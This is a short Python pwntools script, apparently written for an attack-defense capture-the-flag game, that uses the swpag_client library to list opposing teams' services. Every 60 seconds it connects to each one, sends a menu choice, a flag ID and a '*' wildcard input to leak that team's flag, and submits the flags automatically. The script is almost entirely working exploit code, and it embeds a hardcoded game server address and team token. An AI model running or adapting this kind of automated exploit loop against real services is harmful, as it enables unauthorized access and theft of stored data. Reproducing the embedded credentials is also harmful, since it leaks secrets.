from pwn import *
import swpag_client
#t = swpag_client.Team('http://34.211.129.130','PCRz3IhqjCJ1SlDqRVuH')
#targets = t.get_targets(1)
#print(targets)
#target= targets[0
while True:
    t = swpag_client.Team('http://34.211.129.130','PCRz3IhqjCJ1SlDqRVuH')
    targets = t.get_targets(1)
    for target in targets:
        try:
            conn=remote(target['hostname'],target['port'],timeout=5)
            #wait(1)
            print(conn.recvuntil('> '))
            conn.send("2\n")
            print(conn.recvuntil(':'))
            conn.send(target['flag_id']+"\n")
            print(conn.recvuntil(':',timeout=5))
            conn.send("*\n")
            print(conn.recvuntil("securely:\n"))
            test = conn.recvline()
            test = test[:test.find("Hello")]
            print("MY VALUE\n\n"+test+"\n\n")
            conn.send("3\n")
            #print(conn.recvregex('FLG*Helo'))
            conn.close()
            print(t.submit_flag([test]))
        except:
            print('Error on '+target['hostname'])
    print("waiting")
    sleep(60)
